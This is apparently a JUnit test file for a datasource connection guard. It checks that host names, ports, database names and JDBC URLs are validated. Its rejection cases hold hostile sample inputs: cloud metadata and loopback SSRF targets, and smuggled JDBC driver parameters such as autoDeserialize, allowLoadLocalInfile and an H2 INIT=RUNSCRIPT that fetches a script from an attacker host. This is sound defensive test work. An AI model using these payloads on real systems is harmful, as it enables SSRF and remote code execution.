/*
 * Copyright 2024-2026 the original author or authors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 */
package com.sn68.agent.dataagent.service.datasource;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;

import com.sn68.agent.framework.commons.exception.CheckedException;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * {@link DatasourceConnectionGuard} 的连接要素校验用例（PRD S-2）。
 */
class DatasourceConnectionGuardTest {

	@ParameterizedTest
	@ValueSource(strings = { "db.internal", "mysql-01.prod.example.com", "10.20.30.40", "192.168.1.10", "db-1" })
	void acceptsPlausibleDatabaseHosts(String host) {
		assertEquals(host, DatasourceConnectionGuard.requireSafeHost(host));
	}

	@Test
	void trimsSurroundingWhitespaceOnHost() {
		assertEquals("db.internal", DatasourceConnectionGuard.requireSafeHost("  db.internal  "));
	}

	@ParameterizedTest
	@ValueSource(strings = { "127.0.0.1", "127.1.2.3", "localhost", "LOCALHOST", "db.localhost", "0.0.0.0",
			"ip6-localhost" })
	void rejectsLoopbackAndThisNetworkHosts(String host) {
		assertThrows(CheckedException.class, () -> DatasourceConnectionGuard.requireSafeHost(host));
	}

	@ParameterizedTest
	@ValueSource(strings = { "169.254.169.254", "169.254.0.23", "100.100.100.200", "metadata.google.internal",
			"metadata.goog", "metadata.tencentyun.com", "instance-data" })
	void rejectsLinkLocalAndCloudMetadataEndpoints(String host) {
		assertThrows(CheckedException.class, () -> DatasourceConnectionGuard.requireSafeHost(host));
	}

	/**
	 * Java 17 的 {@code InetAddress} 仍解析 inet_aton 变体，只做「首段等于 127」判断会被这些写法绕过。
	 */
	@ParameterizedTest
	@ValueSource(strings = { "2130706433", "0177.0.0.1", "127.1", "127.0.0.256" })
	void rejectsNonDottedQuadNumericHosts(String host) {
		assertThrows(CheckedException.class, () -> DatasourceConnectionGuard.requireSafeHost(host));
	}

	/**
	 * host 一旦能携带 URL 语法，「服务端组装连接串」就形同虚设——参数照样能被追加进去。
	 */
	@ParameterizedTest
	@ValueSource(strings = { "attacker/x?autoDeserialize=true", "attacker:3306", "db.internal;x=1", "db internal",
			"[::1]", "attacker#", "user@db.internal", "" })
	void rejectsHostsCarryingUrlSyntax(String host) {
		assertThrows(CheckedException.class, () -> DatasourceConnectionGuard.requireSafeHost(host));
	}

	@ParameterizedTest
	@ValueSource(ints = { 1, 3306, 65535 })
	void acceptsPortsInRange(int port) {
		assertEquals(port, DatasourceConnectionGuard.requirePortInRange(port));
	}

	@ParameterizedTest
	@ValueSource(ints = { 0, -1, 65536, 70000 })
	void rejectsPortsOutOfRange(int port) {
		assertThrows(CheckedException.class, () -> DatasourceConnectionGuard.requirePortInRange(port));
	}

	@Test
	void rejectsMissingPort() {
		assertThrows(CheckedException.class, () -> DatasourceConnectionGuard.requirePortInRange(null));
	}

	@ParameterizedTest
	@ValueSource(strings = { "analytics", "analytics_ro", "sales-db", "postgres|public", "db.v2" })
	void acceptsPlausibleDatabaseNames(String databaseName) {
		assertEquals(databaseName, DatasourceConnectionGuard.requireSafeDatabaseName(databaseName));
	}

	/**
	 * 库名进入 URL 路径段或 {@code ;} 属性段，放行分隔符等于放行任意驱动参数（H2 的 {@code INIT=RUNSCRIPT} 更是直接 RCE）。
	 */
	@ParameterizedTest
	@ValueSource(strings = { "x?autoDeserialize=true", "db;INIT=RUNSCRIPT FROM 'http://attacker/x.sql'", "db&a=b",
			"db/other", "db name", "" })
	void rejectsDatabaseNamesCarryingUrlSyntax(String databaseName) {
		assertThrows(CheckedException.class, () -> DatasourceConnectionGuard.requireSafeDatabaseName(databaseName));
	}

	@ParameterizedTest
	@ValueSource(strings = { "jdbc:mysql://db.internal:3306/analytics?useUnicode=true",
			"jdbc:postgresql://db.internal:5432/analytics", "jdbc:oracle:thin:@db.internal:1521/ORCL",
			"jdbc:sqlserver://db.internal:1433;databaseName=analytics", "jdbc:dm://db.internal:5236",
			"jdbc:hive2://db.internal:10000/analytics", "jdbc:h2:mem:analytics;MODE=MySQL" })
	void acceptsGeneratedUrlsForSupportedDialects(String url) {
		DatasourceConnectionGuard.requireGeneratedJdbcUrl(url);
	}

	@ParameterizedTest
	@ValueSource(strings = { "jdbc:mysql://db.internal:3306/x?autoDeserialize=true",
			"jdbc:mysql://db.internal:3306/x?allowLoadLocalInfile=true",
			"jdbc:postgresql://db.internal:5432/x?socketFactory=org.attacker.Factory",
			"jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://attacker/x.sql'" })
	void rejectsUrlsCarryingDangerousDriverParameters(String url) {
		assertThrows(CheckedException.class, () -> DatasourceConnectionGuard.requireGeneratedJdbcUrl(url));
		assertThrows(CheckedException.class, () -> DatasourceConnectionGuard.requireNoDangerousJdbcParameters(url));
	}

	/**
	 * {@code allowMultiQueries} 曾是 MySQL 模板的一部分，库里还有带它的历史连接串：新生成的串必须拒绝，
	 * 运行期读取已有串则必须放行，否则存量 MySQL 数据源会全部不可用。
	 */
	@Test
	void rejectsMultiQueryParameterOnlyForNewlyGeneratedUrls() {
		String legacyUrl = "jdbc:mysql://db.internal:3306/x?allowMultiQueries=true";
		assertThrows(CheckedException.class, () -> DatasourceConnectionGuard.requireGeneratedJdbcUrl(legacyUrl));
		DatasourceConnectionGuard.requireNoDangerousJdbcParameters(legacyUrl);
	}

	@ParameterizedTest
	@ValueSource(strings = { "jdbc:mariadb://db.internal:3306/x", "jdbc:derby://db.internal:1527/x",
			"http://db.internal/x" })
	void rejectsGeneratedUrlsOutsideSchemeAllowlist(String url) {
		assertThrows(CheckedException.class, () -> DatasourceConnectionGuard.requireGeneratedJdbcUrl(url));
	}

	@Test
	void rejectsBlankGeneratedUrl() {
		assertThrows(CheckedException.class, () -> DatasourceConnectionGuard.requireGeneratedJdbcUrl(null));
	}

}
